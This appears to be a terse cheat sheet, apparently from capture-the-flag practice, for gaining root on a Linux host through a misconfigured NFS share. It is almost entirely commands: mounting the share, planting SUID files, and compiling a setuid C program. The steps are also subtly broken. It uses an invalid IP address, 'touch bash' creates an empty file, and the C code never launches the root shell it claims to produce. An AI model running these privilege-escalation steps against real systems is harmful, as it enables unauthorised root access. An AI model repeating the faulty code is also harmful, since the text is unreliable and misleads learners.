###########################################################
# This works because whichever user mode you use to upload a file to the share is maintained
###########
#######
###

# sudo mount -o [options] -t nfs ip_address:share directory_to_mount
$ sudo mount -o rw,vers=2 -t nfs 10.10.263.11:/backup /tmp/nfsshare
$ cd /tmp/nfsshare
$ touch bash && chmod +xs bash
#Login with lower priv
$ cd /backup
$ ./bash -p >> flag allows you to run exe as the owner

#############################################################
>> $ mount -o rw <target-IP>:/<remote-dir> /tmp/<local-file>

$ mkdir -p /tmp/localmount
$ mount -o rw 10.10.263.11:/opt /tmp/localmount
$ showmount -e 10.10.263.11
$ cd /tmp/localmount
$ nano nfs.c
 int main()
 { setgid(0);
  setuid(0);
  return 0;
 }

$ gcc nfs.c -o nfs -w >> compile the C code and add suid bit
$ chmod +s nfs
$ ls -lh nfs

# login to target system with limited rigths
# Running the `nfs` executable, generates a root shell

$ cd /opt && ls -lah
$ ./nfs
